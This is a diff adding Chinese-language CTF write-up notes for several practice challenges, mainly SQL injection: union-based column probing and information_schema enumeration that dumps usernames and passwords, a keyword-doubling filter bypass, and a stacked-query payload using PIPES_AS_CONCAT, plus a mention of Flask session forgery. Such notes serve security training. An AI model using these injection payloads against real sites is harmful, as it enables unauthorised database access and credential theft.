@@ -363,3 +363,50 @@ ctf库。。。
 查下b4bsql里面的列1' uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name="b4bsql" #
 列名：id,username,password
 在这里插入图片描述
+### [极客大挑战 2019]LoveSQL
+https://blog.csdn.net/qq_45521281/article/details/105533626
+
+1.1' or 1=1 #   进入，md5解密失败，继续注入
+2.
+/check.php?username=admin' order by 3%23&password=1     存在
+/check.php?username=admin' order by 4%23&password=1     报错
+
+可知共3个字段。用union查询测试注入点（回显点位）：
+
+/check.php?username=1' union select 1,2,3%23&password=1
+
+得到回显点位为2和3，查询当前数据库名及版本：
+
+/check.php?username=1' union select 1,database(),version()%23&password=1
+
+
+/check.php?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=1
+
+/check.php?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'%23&password=1
+
+/check.php?username=1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&password=1
+
+### [HCTF 2018]admin
+
+https://darkwing.moe/2019/11/04/HCTF-2018-admin/
+
+flask, session伪造
+
+### [SUCTF 2019]EasySQL
+堆叠注入
+
+关键的查询代码是 select $post['query']||flag from Flag
+
+输入 1 或 0 查询结果如图，要想办法让 || 不是逻辑或
+
+当 sql_mode 设置了  PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数
+当 sql_mode 没有设置  PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于OR函数  
+
+关于非预期解 : *,1
+拼接一下，不难理解 : select *,1||flag from Flag
+等同于 select *,1 from Flag
+
+
+官方给的 payload 是 1;set sql_mode=PIPES_AS_CONCAT;select 1
+
+拼接一下就是 select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag
